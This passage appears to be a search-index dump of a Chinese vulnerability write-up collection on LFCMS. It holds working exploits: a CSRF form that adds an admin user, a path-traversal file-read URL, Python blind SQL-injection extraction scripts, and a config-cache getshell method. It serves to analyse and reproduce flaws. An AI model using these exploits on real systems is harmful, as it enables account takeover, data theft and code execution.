\"repassword\" value = \"test222\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html > \u901a\u8fc7CSRF\u589e\u52a0\u7ba1\u7406\u5458\u7528\u6237 \u7684exp\u4ee3\u7801\u5982\u4e0b\uff1a < html > < body > < script > history . pushState ( '' , '' , '/' )</ script > < form action = \"http://10.211.55.17/lfdycms3.7.0/admin.php?s=/Member/add.html\" method = \"POST\" > < input type = \"hidden\" name = \"username\" value = \"admin2\" /> < input type = \"hidden\" name = \"password\" value = \"admin2\" /> < input type = \"hidden\" name = \"repassword\" value = \"admin2\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html >","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","text":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd \u00b6 \u4e09\u3001\u590d\u73b0\u8fc7\u7a0b \u00b6 \u6f0f\u6d1e\u8d77\u59cb\u70b9\u4f4d\u4e8e/Application/Admin/Controller/TemplateController.class.php\u4e2d\u7684edit\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u7528\u4f5c\u540e\u53f0\u6a21\u677f\u7f16\u8f91\uff0c\u5173\u952e\u4ee3\u7801\u5982\u4e0b \u6211\u4eec\u4f20\u5165\u7684\u8def\u5f84\u9700\u8981\u5c06/\u66ff\u6362\u4e3a*\u63a5\u7740\u8c03\u7528\u4e86read\u65b9\u6cd5\uff0c\u8ddf\u8fdb\u8be5\u65b9\u6cd5 public function read($filename,$type=''){ return $this->get($filename,'content',$type); } \u7ee7\u7eed\u8ddf\u8fdbget\u65b9\u6cd5 public function get($filename,$name,$type='') { if(!isset($this->contents[$filename])) { if(!is_file($filename)) return false; $this->contents[$filename]=file_get_contents($filename); } $content=$this->contents[$filename]; $info = array( 'mtime' => filemtime($filename), 'content' => $content ); return $info[$name]; } } \u8be5\u65b9\u6cd5\u4e2d\u8fd4\u56de\u4e86\u8981\u8bfb\u53d6\u7684\u6587\u4ef6\u5185\u5bb9\uff0c\u53ef\u4ee5\u770b\u5230\u5728\u6574\u4e2a\u6d41\u7a0b\u4e2d\u6ca1\u6709\u5bf9\u4f20\u5165\u53c2\u6570path\u7684\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u6211\u4eec\u53ef\u4ee5\u8de8\u76ee\u5f55\u8bfb\u6587\u4ef6\uff0c\u4e0b\u9762\u6765\u9a8c\u8bc1\u4e00\u4e0b\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u4e00\u4e0b\u8ddf\u76ee\u5f55index.php\u6587\u4ef6\uff0c\u6d4b\u8bd5\u94fe\u63a5\u5982\u4e0b http://lfcms.com/admin.php?s=/Template/edit/path/*..*index.php \u6210\u529f\u7684\u8bfb\u5230\u4e86CMS\u7684\u5165\u53e3\u6587\u4ef6 \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7844#toc-4","title":"LFCMS\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#_1","text":"","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#_2","text":"","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#_3","text":"\u6f0f\u6d1e\u8d77\u59cb\u70b9\u4f4d\u4e8e/Application/Admin/Controller/TemplateController.class.php\u4e2d\u7684edit\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u7528\u4f5c\u540e\u53f0\u6a21\u677f\u7f16\u8f91\uff0c\u5173\u952e\u4ee3\u7801\u5982\u4e0b \u6211\u4eec\u4f20\u5165\u7684\u8def\u5f84\u9700\u8981\u5c06/\u66ff\u6362\u4e3a*\u63a5\u7740\u8c03\u7528\u4e86read\u65b9\u6cd5\uff0c\u8ddf\u8fdb\u8be5\u65b9\u6cd5 public function read($filename,$type=''){ return $this->get($filename,'content',$type); } \u7ee7\u7eed\u8ddf\u8fdbget\u65b9\u6cd5 public function get($filename,$name,$type='') { if(!isset($this->contents[$filename])) { if(!is_file($filename)) return false; $this->contents[$filename]=file_get_contents($filename); } $content=$this->contents[$filename]; $info = array( 'mtime' => filemtime($filename), 'content' => $content ); return $info[$name]; } } \u8be5\u65b9\u6cd5\u4e2d\u8fd4\u56de\u4e86\u8981\u8bfb\u53d6\u7684\u6587\u4ef6\u5185\u5bb9\uff0c\u53ef\u4ee5\u770b\u5230\u5728\u6574\u4e2a\u6d41\u7a0b\u4e2d\u6ca1\u6709\u5bf9\u4f20\u5165\u53c2\u6570path\u7684\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u6211\u4eec\u53ef\u4ee5\u8de8\u76ee\u5f55\u8bfb\u6587\u4ef6\uff0c\u4e0b\u9762\u6765\u9a8c\u8bc1\u4e00\u4e0b\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u4e00\u4e0b\u8ddf\u76ee\u5f55index.php\u6587\u4ef6\uff0c\u6d4b\u8bd5\u94fe\u63a5\u5982\u4e0b http://lfcms.com/admin.php?s=/Template/edit/path/*..*index.php \u6210\u529f\u7684\u8bfb\u5230\u4e86CMS\u7684\u5165\u53e3\u6587\u4ef6","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#_4","text":"https://xz.aliyun.com/t/7844#toc-4","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/","text":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd \u00b6 \u4e09\u3001\u590d\u73b0\u8fc7\u7a0b \u00b6 \u6f0f\u6d1e\u8d77\u59cb\u70b9\u4f4d\u4e8e/Application/Home/Controller/NewsController.class.php\u4e2d\u7684index\u65b9\u6cd5\uff0c\u4ee3\u7801\u5982\u4e0b \u5728\u4ee3\u7801\u7b2c\u516d\u884c\u8c03\u7528\u4e86News\u6a21\u578b\u4e2d\u7684detail\u65b9\u6cd5\uff0c\u8ddf\u8fdb\u8be5\u65b9\u6cd5 \u53ef\u4ee5\u770b\u5230\u5728\u7b2c\u516b\u884c\u8fdb\u800c\u8c03\u7528\u4e86tp\u7684find\u65b9\u6cd5\uff0c\u5728\u8be5\u7248\u672c\u4e2dfind\u65b9\u6cd5\u662f\u53ef\u4ee5\u8fdb\u884c\u6ce8\u5165\u7684\uff0c\u540c\u65f6\u53c2\u6570$id\u662f\u6211\u4eec\u53ef\u63a7\u7684\uff0c\u9996\u5148\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u6b63\u5e38\u7684\u8f93\u5165\u60c5\u51b5(\u56fe\u4e2d\u57df\u540d\u4e3a\u672c\u5730\u642d\u5efa\u89e3\u6790) \u6839\u636etp3.2\u7684\u6ce8\u5165\u70b9\u6784\u9020\u4e00\u4e0b\u8bed\u53e5\uff0c\u8bbf\u95ee\u5982\u4e0b\u94fe\u63a5 http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and 1-- \u9875\u9762\u4e0e\u6b63\u5e38\u8bbf\u95ee\u76f8\u6bd4\u6ca1\u6709\u53d8\u5316\uff0c\u67e5\u770b\u4e00\u4e0b\u6570\u636e\u5e93\u65e5\u5fd7\uff0c\u770b\u4e0b\u540e\u7aef\u6570\u636e\u5e93\u8bed\u53e5 \u53ef\u4ee5\u770b\u5230\u5728id\u5904\u5df2\u7ecf\u53ef\u4ee5\u8fdb\u884csql\u8bed\u53e5\u7684\u62fc\u63a5\uff0c\u4e5f\u5c31\u8bc1\u660e\u8be5\u5904\u662f\u5b58\u5728\u53ef\u5229\u7528\u7684\u6ce8\u5165\u70b9\u7684\uff0c\u7531\u4e8e\u672c\u5957\u7a0b\u5e8f\u5bf9\u4e8e\u9519\u8bef\u4fe1\u606f\u662f\u6709\u5c4f\u853d\u7684\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u5f88\u96be\u5229\u7528\u62a5\u9519\u6ce8\u5165\u5e26\u51fa\u6570\u636e\uff0c\u5728\u8be5\u5904\u53ef\u4ee5\u8003\u8651\u4f7f\u7528\u5e03\u5c14\u7c7b\u578b\u7684\u76f2\u6ce8\uff0c\u4e24\u79cd\u56de\u663e\u72b6\u6001\u5982\u4e0b \u63a5\u7740\u5199\u4e00\u4e0b\u811a\u672c\uff08\u4ee5\u67e5\u8be2\u6570\u636e\u5e93\u540d\u4e3a\u4f8b\uff09 import requests url = 'http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and ' result = '' for i in range(1,50): print('-----------------------------') for j in range(32,127): payload = 'if((ascii(substr((select database()),{},1))={}),1,0)--'.format(i,j) temp = url+payload try: html = requests.get(temp,timeout=10) if 'tttest' in html.text: result+=chr(j) print(result) break except: print('[-]error') \u7ed3\u679c\u5982\u4e0b \u76f8\u540c\u539f\u7406\u7684\u5229\u7528\u70b9\u8fd8\u6709\u5f88\u591a\uff0c\u5982\u4f4d\u4e8e/Application/Home/Controller/MovieController.class.php\u4e2d\u7684index\u65b9\u6cd5\u7684id\u53c2\u6570\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u91cd\u590d\u5206\u6790\u4e86 \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7844","title":"LFCMS\u524d\u53f0sql\u6ce8\u5165\uff08\u4e00\uff09"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/#_1","text":"","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/#_2","text":"","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/#_3","text":"\u6f0f\u6d1e\u8d77\u59cb\u70b9\u4f4d\u4e8e/Application/Home/Controller/NewsController.class.php\u4e2d\u7684index\u65b9\u6cd5\uff0c\u4ee3\u7801\u5982\u4e0b \u5728\u4ee3\u7801\u7b2c\u516d\u884c\u8c03\u7528\u4e86News\u6a21\u578b\u4e2d\u7684detail\u65b9\u6cd5\uff0c\u8ddf\u8fdb\u8be5\u65b9\u6cd5 \u53ef\u4ee5\u770b\u5230\u5728\u7b2c\u516b\u884c\u8fdb\u800c\u8c03\u7528\u4e86tp\u7684find\u65b9\u6cd5\uff0c\u5728\u8be5\u7248\u672c\u4e2dfind\u65b9\u6cd5\u662f\u53ef\u4ee5\u8fdb\u884c\u6ce8\u5165\u7684\uff0c\u540c\u65f6\u53c2\u6570$id\u662f\u6211\u4eec\u53ef\u63a7\u7684\uff0c\u9996\u5148\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u6b63\u5e38\u7684\u8f93\u5165\u60c5\u51b5(\u56fe\u4e2d\u57df\u540d\u4e3a\u672c\u5730\u642d\u5efa\u89e3\u6790) \u6839\u636etp3.2\u7684\u6ce8\u5165\u70b9\u6784\u9020\u4e00\u4e0b\u8bed\u53e5\uff0c\u8bbf\u95ee\u5982\u4e0b\u94fe\u63a5 http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and 1-- \u9875\u9762\u4e0e\u6b63\u5e38\u8bbf\u95ee\u76f8\u6bd4\u6ca1\u6709\u53d8\u5316\uff0c\u67e5\u770b\u4e00\u4e0b\u6570\u636e\u5e93\u65e5\u5fd7\uff0c\u770b\u4e0b\u540e\u7aef\u6570\u636e\u5e93\u8bed\u53e5 \u53ef\u4ee5\u770b\u5230\u5728id\u5904\u5df2\u7ecf\u53ef\u4ee5\u8fdb\u884csql\u8bed\u53e5\u7684\u62fc\u63a5\uff0c\u4e5f\u5c31\u8bc1\u660e\u8be5\u5904\u662f\u5b58\u5728\u53ef\u5229\u7528\u7684\u6ce8\u5165\u70b9\u7684\uff0c\u7531\u4e8e\u672c\u5957\u7a0b\u5e8f\u5bf9\u4e8e\u9519\u8bef\u4fe1\u606f\u662f\u6709\u5c4f\u853d\u7684\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u5f88\u96be\u5229\u7528\u62a5\u9519\u6ce8\u5165\u5e26\u51fa\u6570\u636e\uff0c\u5728\u8be5\u5904\u53ef\u4ee5\u8003\u8651\u4f7f\u7528\u5e03\u5c14\u7c7b\u578b\u7684\u76f2\u6ce8\uff0c\u4e24\u79cd\u56de\u663e\u72b6\u6001\u5982\u4e0b \u63a5\u7740\u5199\u4e00\u4e0b\u811a\u672c\uff08\u4ee5\u67e5\u8be2\u6570\u636e\u5e93\u540d\u4e3a\u4f8b\uff09 import requests url = 'http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and ' result = '' for i in range(1,50): print('-----------------------------') for j in range(32,127): payload = 'if((ascii(substr((select database()),{},1))={}),1,0)--'.format(i,j) temp = url+payload try: html = requests.get(temp,timeout=10) if 'tttest' in html.text: result+=chr(j) print(result) break except: print('[-]error') \u7ed3\u679c\u5982\u4e0b \u76f8\u540c\u539f\u7406\u7684\u5229\u7528\u70b9\u8fd8\u6709\u5f88\u591a\uff0c\u5982\u4f4d\u4e8e/Application/Home/Controller/MovieController.class.php\u4e2d\u7684index\u65b9\u6cd5\u7684id\u53c2\u6570\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u91cd\u590d\u5206\u6790\u4e86","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/#_4","text":"https://xz.aliyun.com/t/7844","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/","text":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd \u00b6 \u4e09\u3001\u590d\u73b0\u8fc7\u7a0b \u00b6 \u6f0f\u6d1e\u8d77\u59cb\u70b9\u4f4d\u4e8e/Application/Home/Controller/AjaxController.class.php\u6587\u4ef6\u4e2d\u7684randMovie\u65b9\u6cd5\uff0c\u4ee3\u7801\u5982\u4e0b \u7b2c\u4e03\u884c\u4ee3\u7801\u4e2d\u8c03\u7528\u4e86Ajax\u6a21\u578b\u4e2d\u7684randMovie\u65b9\u6cd5\uff0c\u540c\u65f6limit\u548ccategory\u662f\u6211\u4eec\u8f93\u5165\u7684\u53ef\u63a7\u7684\u53c2\u6570\uff0c\u8ddf\u8fdbrandMovie\u65b9\u6cd5 public function randMovie($limit=6,$category='') { if($category) { $type='and category='.$category; } $prefix=C('DB_PREFIX'); $mlist=M()->query('SELECT * FROM `'.$prefix.'movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `'.$prefix.'movie`)-(SELECT MIN(id) FROM `'.$prefix.'movie`))+(SELECT MIN(id) FROM `'.$prefix.'movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx '.$type.' ORDER BY t1.id LIMIT '.$limit); foreach($mlist as $key=>$value) { $list[$key]=D('Tag')->movieChange($value,'movie'); } return $list; } \u5728\u8fd9\u91cc\u6ce8\u610f\u5230 \\(type\u4e0e\\) limit\u5728sql\u8bed\u53e5\u6267\u884c\u65f6\u5747\u6ca1\u6709\u88ab\u5355\u5f15\u53f7\u5305\u88f9\uff0c\u76f4\u63a5\u62fc\u63a5\u5230\u8bed\u53e5\u5f53\u4e2d\uff0c\u8fd9\u91cc\u5c31\u5b58\u5728\u4e86sql\u6ce8\u5165\u7684\u53ef\u80fd\uff0c\u9996\u5148\u6211\u4eec\u5728movie\u8868\u91cc\u653e\u4e00\u6761\u6570\u636e\uff0c\u770b\u4e00\u4e0b\u6b63\u5e38\u6267\u884c\u65f6sql\u8bed\u53e5\u662f\u5982\u4f55\u6267\u884c\u7684 \u67e5\u770b\u6570\u636e\u5e93\u65e5\u5fd7\u53ef\u4ee5\u5f97\u5230\u5982\u4e0bsql\u8bed\u53e5 SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx and category=2 ORDER BY t1.id LIMIT 1 \u63a5\u7740\u6765\u5c1d\u8bd5\u4e0b\u8fdb\u884c\u6ce8\u5165\uff0c\u6d4b\u8bd5\u94fe\u63a5\u5982\u4e0b http://lfcms.com/index.php/Ajax/randMovie?limit=1&category=2 and sleep(5) \u9875\u9762\u786e\u5b9e\u5ef6\u8fdf\u4e865\u79d2\uff0c\u90a3\u4e48\u63a5\u7740\u770b\u4e00\u4e0b\u540e\u7aef\u6570\u636e\u5e93\u7684\u8bed\u53e5 SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx and category=2 and sleep(5) ORDER BY t1.id LIMIT 1 \u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u8be5\u5904\u5b58\u5728\u7740\u53ef\u7528\u7684\u6ce8\u5165\u70b9\uff0c\u63a5\u4e0b\u6765\u7f16\u5199\u811a\u672c\u8dd1\u4e00\u4e0b\u6570\u636e\u5e93\u7528\u6237\u540d\u8bd5\u8bd5 import requests url = 'http://lfcms.com/index.php/Ajax/randMovie?limit=1&category=2 and ' s = requests.session() result = \"\" for i in range(1,50): print('==========================') for j in range(32,127): payload = \"if((ascii(substr((select user()),{},1))={}),sleep(5),0)\".format(i,j) temp = url+payload try: s.get(temp,timeout=5) except: result+= chr(j) print(result) break \u76f8\u540c\u539f\u7406\u7684\u5229\u7528\u70b9\u540c\u6837\u4e0d\u6b62\u4e00\u4e2a\uff0c\u5982/Application/Home/Controller/PlayerController.class.php\u6587\u4ef6\u4e2d\u7684down\u65b9\u6cd5\u8c03\u7528\u4e86\u6a21\u578bmovie\u4e2d\u7684getPlayerUrl\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u7684pid\u53c2\u6570\u540c\u6837\u53ef\u4ee5\u6ce8\u5165 \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/7844","title":"LFCMS\u524d\u53f0sql\u6ce8\u5165\uff08\u4e8c\uff09"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/#_1","text":"","title":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/#_2","text":"","title":"\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/#_3","text":"\u6f0f\u6d1e\u8d77\u59cb\u70b9\u4f4d\u4e8e/Application/Home/Controller/AjaxController.class.php\u6587\u4ef6\u4e2d\u7684randMovie\u65b9\u6cd5\uff0c\u4ee3\u7801\u5982\u4e0b \u7b2c\u4e03\u884c\u4ee3\u7801\u4e2d\u8c03\u7528\u4e86Ajax\u6a21\u578b\u4e2d\u7684randMovie\u65b9\u6cd5\uff0c\u540c\u65f6limit\u548ccategory\u662f\u6211\u4eec\u8f93\u5165\u7684\u53ef\u63a7\u7684\u53c2\u6570\uff0c\u8ddf\u8fdbrandMovie\u65b9\u6cd5 public function randMovie($limit=6,$category='') { if($category) { $type='and category='.$category; } $prefix=C('DB_PREFIX'); $mlist=M()->query('SELECT * FROM `'.$prefix.'movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `'.$prefix.'movie`)-(SELECT MIN(id) FROM `'.$prefix.'movie`))+(SELECT MIN(id) FROM `'.$prefix.'movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx '.$type.' ORDER BY t1.id LIMIT '.$limit); foreach($mlist as $key=>$value) { $list[$key]=D('Tag')->movieChange($value,'movie'); } return $list; } \u5728\u8fd9\u91cc\u6ce8\u610f\u5230 \\(type\u4e0e\\) limit\u5728sql\u8bed\u53e5\u6267\u884c\u65f6\u5747\u6ca1\u6709\u88ab\u5355\u5f15\u53f7\u5305\u88f9\uff0c\u76f4\u63a5\u62fc\u63a5\u5230\u8bed\u53e5\u5f53\u4e2d\uff0c\u8fd9\u91cc\u5c31\u5b58\u5728\u4e86sql\u6ce8\u5165\u7684\u53ef\u80fd\uff0c\u9996\u5148\u6211\u4eec\u5728movie\u8868\u91cc\u653e\u4e00\u6761\u6570\u636e\uff0c\u770b\u4e00\u4e0b\u6b63\u5e38\u6267\u884c\u65f6sql\u8bed\u53e5\u662f\u5982\u4f55\u6267\u884c\u7684 \u67e5\u770b\u6570\u636e\u5e93\u65e5\u5fd7\u53ef\u4ee5\u5f97\u5230\u5982\u4e0bsql\u8bed\u53e5 SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx and category=2 ORDER BY t1.id LIMIT 1 \u63a5\u7740\u6765\u5c1d\u8bd5\u4e0b\u8fdb\u884c\u6ce8\u5165\uff0c\u6d4b\u8bd5\u94fe\u63a5\u5982\u4e0b http://lfcms.com/index.php/Ajax/randMovie?limit=1&category=2 and sleep(5) \u9875\u9762\u786e\u5b9e\u5ef6\u8fdf\u4e865\u79d2\uff0c\u90a3\u4e48\u63a5\u7740\u770b\u4e00\u4e0b\u540e\u7aef\u6570\u636e\u5e93\u7684\u8bed\u53e5 SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx and category=2 and sleep(5) ORDER BY t1.id LIMIT 1 \u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u8be5\u5904\u5b58\u5728\u7740\u53ef\u7528\u7684\u6ce8\u5165\u70b9\uff0c\u63a5\u4e0b\u6765\u7f16\u5199\u811a\u672c\u8dd1\u4e00\u4e0b\u6570\u636e\u5e93\u7528\u6237\u540d\u8bd5\u8bd5 import requests url = 'http://lfcms.com/index.php/Ajax/randMovie?limit=1&category=2 and ' s = requests.session() result = \"\" for i in range(1,50): print('==========================') for j in range(32,127): payload = \"if((ascii(substr((select user()),{},1))={}),sleep(5),0)\".format(i,j) temp = url+payload try: s.get(temp,timeout=5) except: result+= chr(j) print(result) break \u76f8\u540c\u539f\u7406\u7684\u5229\u7528\u70b9\u540c\u6837\u4e0d\u6b62\u4e00\u4e2a\uff0c\u5982/Application/Home/Controller/PlayerController.class.php\u6587\u4ef6\u4e2d\u7684down\u65b9\u6cd5\u8c03\u7528\u4e86\u6a21\u578bmovie\u4e2d\u7684getPlayerUrl\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u7684pid\u53c2\u6570\u540c\u6837\u53ef\u4ee5\u6ce8\u5165","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/#_4","text":"https://xz.aliyun.com/t/7844","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/LFCMS/LFCMS%E5%90%8E%E5%8F%B0getshell/","text":"\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd \u00b6 \u4e09\u3001\u590d\u73b0\u8fc7\u7a0b \u00b6 \u8be5\u6f0f\u6d1e\u53ef\u4ee5\u5229\u7528\u7684\u539f\u56e0\u4e00\u662f\u5728\u4e8e\u540e\u53f0\u5bf9\u4e8e\u7ad9\u70b9\u914d\u7f6e\u6570\u636e\u6ca1\u6709\u505a\u597d\u8fc7\u6ee4\uff0c\u4e8c\u662f\u5229\u7528\u4e86tp3.2\u7248\u672c\u4e0b\u672c\u8eab\u5b58\u5728\u7684\u7f13\u5b58\u6f0f\u6d1e\uff0c\u6f0f\u6d1e\u8d77\u59cb\u5229\u7528\u70b9\u4f4d\u4e8e/Application/Admin/Controller/ConfigController.class.php\u4e2d\u7684save\u65b9\u6cd5\uff0c\u4ee3\u7801\u5982\u4e0b \u8be5\u5904\u5c06\u540e\u53f0\u8bbe\u7f6e\u7684\u914d\u7f6e\u9879\u76f4\u63a5\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u63a5\u7740\u5f53\u7528\u6237\u8bbf\u95ee\u7ad9\u70b9\u524d\u53f0\u9875\u9762\u65f6\uff0c\u4f1a\u8c03\u7528/Application/Home/Controller/HomeController.class.php\u4e2d\u7684_initialize\u65b9\u6cd5\uff0c\u90e8\u5206\u4ee3\u7801\u5982\u56fe \u5f53\u7b2c\u4e00\u6b21\u8bbf\u95ee\u65f6\uff0c\u4f1a\u8c03\u7528\u7b2c\u4e8c\u5341\u4e00\u884c\u7684\u7f13\u5b58\u51fd\u6570\u5199\u7f13\u5b58\u6587\u4ef6\uff0c\u5728\u8fd9\u91cc\u5982\u679c\u5728\u8bbe\u7f6e\u914d\u7f6e\u6570\u636e\u7684\u65f6\u5019\u5199\u5165\u6076\u610f\u7684PHP\u4ee3\u7801\uff0c\u5c31\u53ef\u4ee5\u5728\u7f13\u5b58\u6587\u4ef6\u4e2d\u5199\u5165\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u8fdb\u800cgetshell\uff0c\u9996\u5148\u6211\u4eec\u6765\u5230\u540e\u53f0\u7528\u6237\u914d\u7f6e\u8bbe\u7f6e\u5904 \u63d0\u4ea4\u6570\u636e\u6293\u53d6\u6570\u636e\u5305\uff0c\u5728\u5176\u4e2d\u4e00\u4e2a\u8bbe\u7f6e\u9879\u4e2d\u586b\u5165php\u4ee3\u7801\uff0c\u7531\u4e8e\u7f13\u5b58\u6587\u4ef6\u5bf9\u4e8e\u914d\u7f6e\u9879\u8fdb\u884c\u4e86\u6ce8\u91ca\uff0c\u4e3a\u4e86\u9003\u9038\u6ce8\u91ca\u6211\u4eec\u9700\u8981\u53e6\u8d77\u4e00\u884c\u5199\u5165PHP\u4ee3\u7801\u5e76\u5c06\u540e\u9762\u7684\u65e0\u7528\u6570\u636e\u6ce8\u91ca\u6389\uff0c\u5982\u56fe \u7136\u540e\u8bbf\u95ee\u524d\u53f0\u9875\u9762\u751f\u6210\u7f13\u5b58\u6587\u4ef6\uff0c\u7f13\u5b58\u6587\u4ef6\u5728/Application/Runtime/Temp/\u76ee\u5f55\u4e0b\uff0c\u6587\u4ef6\u540d\u4e3a\u7f13\u5b58\u6570\u636e\u540d\u79f0\u7684MD5\u503c\uff0c\u5728\u8fd9\u91cc\u4e5f\u5c31\u662fDB_CONFIG_DATA\u7684MD5\u503c\uff0c\u6211\u4eec\u76f4\u63a5\u8bbf\u95ee\u7f13\u5b58\u6587\u4ef6 http://lfcms.com/Application/Runtime/Temp/95a1fe934b68ebfee8468bf0bc4f0000.php \u6210\u529f\u7684\u5199\u5165\u4e86PHP\u4ee3\u7801 \u53c2\u8003\u94fe\u63a5 \u00b6 